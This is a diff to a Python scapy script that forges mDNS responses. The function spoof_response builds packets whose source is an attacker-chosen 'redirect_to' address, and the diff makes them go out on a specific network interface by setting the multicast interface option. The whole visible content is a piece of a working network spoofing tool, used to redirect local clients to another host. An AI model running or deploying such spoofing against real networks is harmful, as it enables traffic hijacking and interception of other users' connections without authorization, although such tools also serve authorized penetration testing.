@@ -4,10 +4,12 @@
 from scapy.all import *
 from struct import pack
 from time import sleep
+import scapy.arch
 import requests
 import xml.etree.ElementTree as ET
 import binascii
 import sys
+import socket
 
 ## Create a Packet Count var
 packetCount = 0
@@ -98,7 +100,9 @@ def spoof_response(pkt):
 
     #spoofed_pkt = IP(src='192.168.1.104', dst='224.0.0.251')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
     spoofed_pkt = IP(src=redirect_to, dst=pkt[IP].dst)/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
-    send(spoofed_pkt)
+    sock=conf.L3socket()
+    sock.outs.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(scapy.arch.get_if_addr(interface)))
+    send(spoofed_pkt,socket=sock)
     print 'Sent spoofed response:', spoofed_pkt.summary()
 
 
